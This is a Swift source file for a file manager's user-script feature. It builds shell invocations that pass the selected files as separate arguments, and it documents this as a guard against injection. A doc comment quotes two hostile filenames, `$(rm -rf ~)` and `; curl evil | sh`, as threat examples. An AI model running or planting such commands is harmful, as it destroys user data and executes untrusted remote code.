import Foundation

/// How a user script consumes a multi-file selection (PLAN.md §M6 "user actions — shell scripts
/// receiving selection as argv/env").
public enum UserScriptRunMode: String, Sendable, Codable, CaseIterable {
    /// One invocation for the whole selection: every selected path is a positional argument
    /// (`"$@"` / `$1 $2 …`). The natural mode for a script that already loops over its arguments,
    /// or for a tool that takes a list ("open all of these in Preview", "add these to an archive").
    case combined
    /// One invocation per selected path, `$1` being that single file. The natural mode for a
    /// per-file transform where hand-writing the loop is a chore — the "convert each to webp"
    /// exit-criterion case. An empty selection yields *no* invocations (nothing to act on).
    case perFile
}

/// The environment variables a running user script can read to learn its context beyond the file
/// arguments — the panel directories and the selection as a whole. Kept as named constants so the
/// app, the tests, and any future documentation reference one spelling rather than magic strings.
///
/// The **arguments** (`"$@"`) are the authoritative list of files to act on; these variables are a
/// convenience layer. In particular `selectedPaths` joins the paths with newlines, which is
/// ambiguous for the (rare, pathological) filename that itself contains a newline — `"$@"` has no
/// such ambiguity, which is why the paths ride in argv and this is only a courtesy for scripts that
/// would rather read a variable.
public enum UserScriptEnvironment {
    /// The active panel's directory. Also the running process's working directory, so a bare
    /// `ls`/`git status` in the script refers to the folder the user is looking at.
    public static let currentDirectory = "DIRNEX_CURRENT_DIR"
    /// The *other* panel's directory — the copy/move destination in a dual-pane workflow. Absent
    /// when there is no second pane.
    public static let otherDirectory = "DIRNEX_OTHER_DIR"
    /// The number of selected items, as a base-10 string.
    public static let selectionCount = "DIRNEX_SELECTION_COUNT"
    /// Every selected absolute path, newline-joined (see the type note on ambiguity).
    public static let selectedPaths = "DIRNEX_SELECTED_PATHS"
}

/// Everything a script needs to know about *where* it is running, independent of the script itself:
/// the selected paths and the two panel directories. The app assembles this from the active pane's
/// marked set (or the cursor file) and the two panes' current directories; the core turns it into
/// process arguments and environment.
public struct UserScriptContext: Sendable, Hashable {
    /// The absolute paths the script acts on, in display order — the marked set, or the single
    /// cursor file when nothing is marked. May be empty (a `combined` script can still run against
    /// the current directory via the environment).
    public let selection: [String]
    /// The active panel's directory: the process working directory and `DIRNEX_CURRENT_DIR`.
    public let currentDirectory: String
    /// The inactive panel's directory (`DIRNEX_OTHER_DIR`), or `nil` when there is no second pane.
    public let otherDirectory: String?

    public init(selection: [String], currentDirectory: String, otherDirectory: String? = nil) {
        self.selection = selection
        self.currentDirectory = currentDirectory
        self.otherDirectory = otherDirectory
    }

    /// The `DIRNEX_*` environment for this context (see `UserScriptEnvironment`). `otherDirectory`
    /// is included only when present, so a script can test for it with `[ -n "$DIRNEX_OTHER_DIR" ]`.
    public func environment() -> [String: String] {
        var environment = [
            UserScriptEnvironment.currentDirectory: currentDirectory,
            UserScriptEnvironment.selectionCount: String(selection.count),
            UserScriptEnvironment.selectedPaths: selection.joined(separator: "\n")
        ]
        if let otherDirectory {
            environment[UserScriptEnvironment.otherDirectory] = otherDirectory
        }
        return environment
    }
}

/// A concrete launch of a user script: the shell to run, the full argument vector, the environment,
/// and the working directory — ready to hand to a process launcher. `combined` scripts produce one
/// of these; `perFile` scripts produce one per selected file.
public struct UserScriptInvocation: Sendable, Hashable {
    /// The shell interpreter, e.g. `/bin/zsh` or `/bin/sh`. The app resolves which shell; the core
    /// stays neutral (the same file can run under either).
    public let executablePath: String
    /// `["-c", <script>, <name>, <file>…]`. The script's *own* text is one argument; the selected
    /// paths follow as further arguments (see `UserScript.invocations` for why this ordering is
    /// the security boundary).
    public let arguments: [String]
    /// The `DIRNEX_*` variables merged over the inherited environment by the launcher.
    public let environment: [String: String]
    /// The active panel's directory — where the process starts.
    public let currentDirectoryPath: String

    public init(
        executablePath: String,
        arguments: [String],
        environment: [String: String],
        currentDirectoryPath: String
    ) {
        self.executablePath = executablePath
        self.arguments = arguments
        self.environment = environment
        self.currentDirectoryPath = currentDirectoryPath
    }
}

/// A user-authored shell action Dirnex runs against the current selection, surfaced in the command
/// palette and (later) the F-key bar (PLAN.md §M6; the exit criterion is "a user-defined 'convert
/// to webp' script on selection runs from the palette").
///
/// Identity is the `name`, so a script is saved once per name (re-saving under an existing name
/// updates it in place), matching `SavedSearch`, `ServerConnection`, and `Workspace`. The whole
/// thing is boring, secret-free JSON.
///
/// **Security boundary — the reason this is a tested core type, not app glue.** The script text is
/// authored by the user and therefore trusted. The *selected paths* are not: unzip an archive from
/// the internet and you can be looking at a file called ``$(rm -rf ~)`` or ``; curl evil | sh``.
/// Those paths are handed to the shell as **separate `argv` elements** (and as environment values),
/// **never concatenated into the script text**, so a hostile filename arrives at the script as one
/// inert `"$1"` — it cannot break out and execute. This is the same "a filename is
/// attacker-controlled data" stance `ShellCommandLine` takes for the terminal drawer, and a test
/// pins it. (The one thing the user must still write carefully is their *own* script — but that is
/// their code, run at their request, exactly like typing it into a terminal.)
public struct UserScript: Sendable, Hashable, Identifiable, Codable {
    /// The user-facing label shown in the palette / menu — and the script's identity: at most one
    /// script per name.
    public var name: String
    /// The shell code, run via `<shell> -c <command>`. The selection arrives as positional
    /// arguments (`"$@"` / `$1`), so a per-file transform reads `cwebp "$1" -o "${1%.*}.webp"` and
    /// a whole-selection one reads a loop over `"$@"`.
    public var command: String
    /// Whether the whole selection is passed to one run or the script runs once per file.
    public var runMode: UserScriptRunMode
    /// Extra terms the palette matches against beyond the name — synonyms so "image"/"convert"
    /// find a "To WebP" script whose name contains neither.
    public var keywords: [String]

    public init(
        name: String,
        command: String,
        runMode: UserScriptRunMode = .combined,
        keywords: [String] = []
    ) {
        self.name = name
        self.command = command
        self.runMode = runMode
        self.keywords = keywords
    }

    public var id: String { name }

    /// The concrete launches to run for `context`, using `shell` as the interpreter.
    ///
    /// `combined` → a single invocation whose file arguments are the whole selection (empty when
    /// nothing is selected, letting a directory-scoped script still run once). `perFile` → one
    /// invocation per selected file, so an empty selection produces an empty array (nothing to do).
    ///
    /// The argument vector is `["-c", command, name] + files`: passing `name` as `$0` makes the
    /// shell's own diagnostics read `<name>: …` instead of `sh: …`, and — the load-bearing part —
    /// every file is its own element after it, so no path is ever spliced into `command` as text.
    public func invocations(in context: UserScriptContext, shell: String) -> [UserScriptInvocation] {
        let environment = context.environment()
        switch runMode {
        case .combined:
            return [
                invocation(
                    files: context.selection,
                    environment: environment,
                    context: context,
                    shell: shell
                )
            ]
        case .perFile:
            return context.selection.map { file in
                invocation(files: [file], environment: environment, context: context, shell: shell)
            }
        }
    }

    private func invocation(
        files: [String],
        environment: [String: String],
        context: UserScriptContext,
        shell: String
    ) -> UserScriptInvocation {
        UserScriptInvocation(
            executablePath: shell,
            arguments: ["-c", command, name] + files,
            environment: environment,
            currentDirectoryPath: context.currentDirectory
        )
    }
}

public extension UserScript {
    /// The prefix that namespaces a user script inside the flat command-id space the palette and
    /// key bindings share, keeping it clear of the static `file.*`/`go.*` ids. The app recognises
    /// this prefix to route a palette pick to the script runner rather than an AppKit selector.
    static let commandIDPrefix = "userScript."

    /// This script's palette/command id, e.g. `userScript.To WebP`. Stable for as long as the name
    /// is (renaming is a new id, which is correct — recents/bindings key off identity).
    var commandID: String { Self.commandIDPrefix + name }

    /// The script name encoded in a `userScript.*` command id, or `nil` for any other id — the
    /// inverse of `commandID`, used by the app to find which script a palette pick refers to.
    static func name(fromCommandID id: String) -> String? {
        guard id.hasPrefix(commandIDPrefix) else { return nil }
        return String(id.dropFirst(commandIDPrefix.count))
    }

    /// A palette `Command` describing this script, so it ranks and renders alongside the built-in
    /// actions. Grouped under `.file` (it acts on the selected files); it carries no default
    /// shortcut here (an F-key binding is an app/settings concern layered on later).
    var paletteCommand: Command {
        Command(
            id: commandID,
            title: name,
            category: .file,
            keywords: keywords + ["script", "user", "run", "automation"]
        )
    }
}
